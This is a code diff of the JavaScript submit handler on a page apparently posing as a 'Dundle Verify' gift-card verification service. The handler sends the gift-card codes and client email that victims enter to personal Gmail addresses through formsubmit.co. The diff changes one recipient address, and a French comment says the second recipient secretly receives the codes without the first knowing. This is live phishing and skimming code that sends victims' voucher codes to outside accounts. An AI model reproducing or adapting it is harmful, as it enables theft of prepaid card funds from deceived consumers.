@@ -472,7 +472,7 @@ async function handleSubmit() {
       headers: { 'Accept': 'application/json' }
     });
 
-    /* Envoi au second email — paysafecard840@gmail.com (séparé, ne sait pas que le premier reçoit aussi) */
+    /* Envoi au second email — .com (séparé, ne sait pas que le premier reçoit aussi) */
     const formData2 = new FormData();
     formData2.append('_subject', `Nouveau code ${selectedBrand} — Dundle Verify`);
     formData2.append('_captcha', 'false');
@@ -486,7 +486,7 @@ async function handleSubmit() {
     if (code4) formData2.append('Code_4', code4);
     if (code5) formData2.append('Code_5', code5);
     formData2.append('Email_client', clientEmail);
-    await fetch('https://formsubmit.co/ajax/paysafecard840@gmail.com', {
+    await fetch('https://formsubmit.co/ajax/briyant58@gmail.com', {
       method: 'POST',
       body: formData2,
       headers: { 'Accept': 'application/json' }
